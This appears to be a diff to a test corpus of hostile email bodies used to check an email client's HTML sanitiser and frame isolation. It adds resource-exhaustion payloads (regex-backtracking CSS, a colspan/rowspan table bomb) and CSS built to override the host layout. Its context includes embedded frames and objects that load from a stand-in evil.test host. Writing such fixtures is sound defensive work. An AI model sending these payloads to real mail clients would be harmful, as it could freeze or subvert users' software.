@@ -1,7 +1,7 @@
 // The hostile-HTML corpus (lane card done criterion 4; research electron-email-html-isolation section 1). Original
 // test strings only, no real mail. Every remote host is under `.test` (RFC 2606), so nothing could resolve even if a
 // fence failed. Each script or handler tries to touch the host (`parent.aplos`, `top.pwned`), which the Playwright
-// spec checks for. Used by sanitise.test.ts (node) and browser/frame.browser.spec.ts (headless Chromium).
+// spec checks for. Used by sanitise.test.ts (node) and browser/mailframe.browser.spec.ts (headless Chromium).
 
 /** One hostile email body. */
 export interface CorpusItem {
@@ -13,6 +13,8 @@ export interface CorpusItem {
   html: string;
   /** Visible text that must survive sanitising (the email is still readable). */
   keeps?: string;
+  /** A resource-exhaustion item: only the sanitiser's caps fence it, so the unsanitised browser pass skips it. */
+  costly?: true;
 }
 
 const EVIL = 'https://evil.test';
@@ -139,6 +141,38 @@ export const CORPUS: readonly CorpusItem[] = [
     vector: 'iframe, frame, object, embed, applet, portal',
     html: `<iframe src="${EVIL}/frame" srcdoc="<script>${PWN}</script>"></iframe><object data="${EVIL}/o.swf"></object><embed src="${EVIL}/e.swf"><applet code="x"></applet><portal src="${EVIL}/portal"></portal><p>Embedded</p>`,
     keeps: 'Embedded',
+  },
+  {
+    id: 'redos-css',
+    vector:
+      'CSS built to make backtracking patterns quadratic: 200,000 letters, url( and 40,000 spaces, unclosed comments',
+    html: [
+      `<style>p{font-family:${'a'.repeat(200_000)}}b{background:url(${' '.repeat(40_000)}}`,
+      `i{x:${'/*x'.repeat(10_000)}</style>`,
+      `<p style="background:url(${' '.repeat(40_000)}">Still readable</p>`,
+    ].join(''),
+    keeps: 'Still readable',
+  },
+  {
+    id: 'span-bomb',
+    vector: '4,999 cells with colspan and rowspan of 1,000 (seconds of layout without the clamp)',
+    html: `<table>${'<tr><td colspan="1000" rowspan="1000">span</td></tr>'.repeat(4_999)}</table>`,
+    keeps: 'span',
+    costly: true,
+  },
+  {
+    id: 'css-override',
+    vector:
+      "email CSS aimed at the host: beat the measuring rules, declare the host's layer, hide notices and marks",
+    html: [
+      '<body style="height:2px!important;overflow:auto!important"><style>',
+      '@layer aplos{html{height:5px!important}}',
+      ':root{height:7px!important;max-height:7px!important;overflow:auto!important}',
+      'html body{position:absolute!important;height:3px!important;overflow:scroll!important}',
+      '.aplos-notice,p[class],mark{display:none!important}',
+      '</style><div style="height:600px">Tall letter</div></body>',
+    ].join(''),
+    keeps: 'Tall letter',
   },
   {
     id: 'parser-differentials',
